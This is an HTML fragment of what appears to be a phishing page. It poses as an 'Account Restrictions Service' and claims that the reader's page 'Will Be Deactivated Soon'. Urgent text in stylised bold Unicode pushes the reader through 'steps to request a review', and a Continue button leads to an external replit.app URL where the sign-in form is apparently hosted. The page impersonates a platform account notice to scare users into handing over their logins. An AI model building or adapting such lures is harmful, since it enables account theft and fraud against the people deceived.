...
<body>
    <div id="container">
        <div id="box">
            ...
            <div id="data">
                <h4>Account Restrictions Service</h4> <img src="https://e7.pngegg.com/pngimages/107/701/png-clipart-computer-icons-check-mark-symbol-symbol-miscellaneous-blue.png" alt="">
            </div>
            <div class="line"></div>
            <div id="para">
                <h2> Your Page Will Be Deactivated Soon</h2>
                <p>𝐖𝐞 𝐖𝐢𝐥𝐥 𝐖𝐚𝐥𝐤 𝐘𝐨𝐮 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐒𝐞𝐯𝐞𝐫𝐚𝐥 𝐒𝐭𝐞𝐩𝐬 𝐭𝐨 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐚 𝐑𝐞𝐯𝐢𝐞𝐰 𝐘𝐨𝐮 𝐒𝐡𝐨𝐮𝐥𝐝 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐓𝐡𝐞𝐬𝐞 𝐒𝐭𝐞𝐩𝐬 𝐒𝐨 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲.
                    </p>
                <button> <a href="https://help-restrictions.replit.app/request">Continue</a> </button>
            </div>
        </div>
    </div>
